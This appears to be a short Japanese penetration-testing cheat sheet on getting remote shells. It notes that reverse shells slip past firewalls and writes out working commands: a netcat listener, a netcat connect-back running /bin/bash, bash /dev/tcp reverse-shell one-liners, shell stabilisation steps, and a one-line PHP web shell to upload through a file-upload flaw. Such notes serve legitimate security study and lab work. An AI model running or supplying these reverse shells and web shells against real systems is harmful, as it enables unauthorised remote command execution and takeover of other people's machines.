# 遠隔からのシェル

* ファイアウォールでインバウンド通信で接続とポートが許可されている場合はバインドシェルが可能
* アウトバウンド通信は許可されている場合が多いためリバースシェルはファイアウォールを回避しやすい。
* バインドシェル・リバースシェル `netcat`を使用

1. 待ち受け　`nc -vlp 1027`
2. 接続     `nc -v 192.168.XXX.XXX 1027 -e /bin/bash` (/bin/bashのところはwindowsならcmd.exe)
3. ncがない場合の接続
    1. `bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1`
    2. `bash -c 'bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1'`
4. シェルの安定化
    * python
    1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    2. `CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`
    * shell
    1. `script /dev/null -qc /bin/bash` #/dev/null is to not store anything(inside the nc session)
    2. `CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`

* Webシェル

1. 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
2. アップしたphpファイルを利用してweb経由でコマンド実行
    `<?php system($_GET["cmd"]); ?>`
